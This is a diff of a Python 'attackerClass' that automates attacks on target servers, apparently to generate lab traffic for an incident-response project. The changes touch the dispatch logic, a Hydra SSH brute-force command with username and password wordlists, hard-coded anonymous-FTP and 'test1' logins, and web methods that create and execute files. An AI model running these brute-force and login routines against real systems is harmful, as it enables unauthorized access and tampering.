@@ -43,7 +43,7 @@ class attackerClass(object):
 		'''
 
 		try:
-			#print(service_array)
+
 			for key, val in service_array.items():
 				current_ip = val[0].get("IP")
 				current_method = val[0].get("Method")
@@ -58,15 +58,25 @@ class attackerClass(object):
 
 					if current_ip == next_ip and current_service == next_service and current_method == next_method:
 						print("Repeating Method: {} On Server: {} Service: {} \n".format(current_method,current_ip,current_service))
-						break
+
 					elif current_ip == next_ip and current_service == next_service and current_method != next_method:
 						print("Executing: {} On Server: {}  Service: {} \n".format(current_method,current_ip,current_service))
 						attackerClass.call_class_method(current_method,current_ip,current_user,current_pass)
 						break
-					elif current_ip != next_ip and current_service != next_service and current_method != next_method:
+
+					elif current_ip != next_ip and current_service == next_service and current_method == next_method:
 						print("Executing: {} On Server: {}  Service: {} \n".format(current_method,current_ip,current_service))
 						attackerClass.call_class_method(current_method,current_ip,current_user,current_pass)
 						break
+
+					elif current_ip != next_ip and current_service == next_service and current_method != next_method:
+						print("Executing: {} On Server: {}  Service: {} \n".format(current_method,current_ip,current_service))
+						attackerClass.call_class_method(current_method,current_ip,current_user,current_pass)
+						break
+					else:
+						print("None")
+
+
 
 		except Exception as e:
 			print (str(e))
@@ -100,7 +110,7 @@ class attackerClass(object):
 
 		try:
 			print("Hydra BruteForce Being Executed")
-			command = "hydra -L /home/ubuntu/Documents/usernames.txt -P /home/ubuntu/Documents/usernames.txt {} ssh".format(ip)
+			command = "hydra -L /home/alex/Documents/GitRepo/IR/usernames.txt -P /home/alex/Documents/GitRepo/IR/passwords.txt {} ssh".format(ip)
 			child = pexpect.spawn(command)
 			time.sleep(30)
 			print("BruteForce Successfully Executed")
@@ -125,7 +135,8 @@ class attackerClass(object):
 		'''
 
 		ip = args["IP"]
-		user = args["User"]
+		user='ftp'
+		#user = args["User"]
 
 		try:
 			print("Anonymous Login Being Executed")
@@ -149,7 +160,8 @@ class attackerClass(object):
 		Put a file into the machine
 		'''
 		ip = args["IP"]
-		user = args["User"]
+		user='ftp'
+		#user = args["User"]
 
 		try:
 			print("Anonymous File Creation Being Executed")
@@ -176,7 +188,8 @@ class attackerClass(object):
 		'''
 
 		ip = args["IP"]
-		user = args["User"]
+		user='ftp'
+		#user = args["User"]
 
 		try:
 			print("Anonymous File Download Executed")
@@ -203,8 +216,8 @@ class attackerClass(object):
 		FTP directly into the machine using parameters received
 		'''
 		ip = args["IP"]
-		user = args["User"]
-		password = args["Pass"]
+		user = 'test1'#args["User"]
+		password ='test1'# args["Pass"]
 
 		try:
 			print("Login Being Executed")
@@ -231,8 +244,8 @@ class attackerClass(object):
 		'''
 
 		ip = args["IP"]
-		user = args["User"]
-		password = args["Pass"]
+		user = 'test1'#args["User"]
+		password ='test1'# args["Pass"]
 
 		try:
 			print("File Creation Being Executed")
@@ -262,8 +275,8 @@ class attackerClass(object):
 		'''
 
 		ip = args["IP"]
-		user = args["User"]
-		password = args["Pass"]
+		user = 'test1'#args["User"]
+		password ='test1'# args["Pass"]
 
 		try:
 			print("File Creation Being Executed")
@@ -293,8 +306,8 @@ class attackerClass(object):
 		'''
 
 		ip = args["IP"]
-		user = args["User"]
-		password = args["Pass"]
+		user = 'test1'#args["User"]
+		password ='test1'# args["Pass"]
 
 		try:
 			print("File Download Being Executed")
@@ -548,7 +561,7 @@ class attackerClass(object):
 			log.exception(e)
 		
 	@staticmethod
-	def execute_web_sudo_login():
+	def execute_web_sudo_login(args):
 		'''
 		SSH directly into the machine using parameters received
 		'''
@@ -594,7 +607,7 @@ class attackerClass(object):
 			log.exception(e)
 		
 	@staticmethod
-	def execute_web_create_file():
+	def execute_web_create_file(args):
 		'''
 		SSH directly into the machine using parameters received
 		'''
@@ -644,7 +657,7 @@ class attackerClass(object):
 			log.exception(e)
 		
 	@staticmethod
-	def execute_web_execute_file():
+	def execute_web_execute_file(args):
 		'''
 		SSH directly into the machine using parameters received
 		'''
@@ -747,9 +760,7 @@ class attackerClass(object):
 	
 if __name__ == "__main__":
 	object = attackerClass()
-	#object.get_data()
 	the_array=object.get_data()
-	print(the_array)
 	object.generate_random_request(the_array)
 
 	print('====Execution Complete====')
